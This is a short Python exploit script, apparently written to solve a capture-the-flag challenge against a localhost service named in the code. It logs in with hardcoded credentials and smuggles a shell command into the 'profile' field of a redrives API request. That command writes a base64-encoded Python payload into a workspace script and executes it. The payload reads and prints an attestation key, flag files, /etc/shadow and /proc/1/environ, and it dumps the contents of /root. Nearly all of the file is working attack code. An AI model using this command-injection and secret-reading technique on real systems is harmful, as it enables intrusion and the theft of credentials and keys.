import json, base64, os, urllib.request, urllib.error
BASE=os.environ.get("WASMNESIA_BASE", "http://127.0.0.1:8080")
def http(url,data=None,token=None,method=None,timeout=30):
    h={"Content-Type":"application/json"}
    if token:h["Authorization"]="Bearer "+token
    b=json.dumps(data).encode() if data is not None else None
    r=urllib.request.Request(url,data=b,headers=h,method=method)
    try:
        with urllib.request.urlopen(r,timeout=timeout) as x:return x.status,x.read()
    except urllib.error.HTTPError as e:return e.code,e.read()
    except Exception as e:return -1,str(e).encode()
st,b=http(BASE+"/api/v1/login",{"username":"reviewer@edgeledger.test","password":"Replay-Wasm-2026"})
tok=json.loads(b)["token"]
base={"execution_id":"job-f1234001","generation":5,"input_sha256":"5fc3d7d04a7842f9af0a18a3836622f60a37478249d07e668338beac3def7676"}
payload = r'''
import os, glob, json
def run(): pass
paths=["/var/lib/edgeledger/attestation.key","/root/flag","/root/flag.txt","/flag","/home/ctf/flag","/etc/shadow","/proc/1/environ"]
for p in paths:
    try:
        d=open(p,"rb").read()
        print("FILE",p,repr(d))
    except Exception as e:
        print("ERR",p,repr(e))
for p in sorted(set(glob.glob("/root/*")+glob.glob("/root/.*")+glob.glob("/var/lib/edgeledger/*"))):
    try:
        d=open(p,"rb").read()
        print("LS",p,len(d),repr(d[:300]))
    except Exception as e:
        print("LERR",p,repr(e))
'''
b64=base64.b64encode(payload.encode()).decode()
cmd="echo %s | base64 -d > /app/workspace/edge_health.py; chmod 644 /app/workspace/edge_health.py; /usr/local/bin/edge-health"%b64
d=dict(base);d["profile"]="archive-jsonl;"+cmd
st,b=http(BASE+"/api/v1/operations/redrives",d,tok,"POST")
print("status",st)
try:
    j=json.loads(b);print("exit",j.get("exit_code"));print(j.get("output"))
except Exception: print(b[:3000])
